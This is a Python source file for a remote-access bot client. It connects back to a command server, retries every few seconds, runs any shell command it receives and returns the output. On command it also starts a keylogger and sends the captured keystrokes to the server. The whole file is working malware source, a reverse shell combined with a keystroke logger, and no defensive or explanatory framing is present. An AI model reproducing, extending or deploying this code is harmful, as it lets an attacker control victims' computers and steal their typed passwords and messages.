# bot_client.py
import socket
import subprocess
import os
import threading
import time
from pynput import keyboard

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999
BUFFER_SIZE = 1024 * 10

key_logs = []
logging = False

def keylogger_worker():
    def on_press(key):
        try:
            key_logs.append(str(key.char))
        except AttributeError:
            key_logs.append(str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylogger():
    global logging
    if not logging:
        logging = True
        threading.Thread(target=keylogger_worker, daemon=True).start()

def send_keylogs(s):
    global key_logs
    logs = ''.join(key_logs)
    if logs:
        s.sendall(logs.encode())
        key_logs = []  # clear after sending
    else:
        s.sendall(b'[+] No keys logged yet.')

def handle_server_commands(s):
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command == "keylogger":
            start_keylogger()
            s.sendall(b"[+] Keylogger started")
        elif command == "getlogs":
            send_keylogs(s)
        elif command.startswith("cd "):
            os.chdir(command[3:])
            s.sendall(b"[+] Changed directory")
        elif command == "exit":
            break
        else:
            output = subprocess.getoutput(command)
            s.sendall(output.encode())

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            handle_server_commands(s)
        except:
            time.sleep(5)

connect()
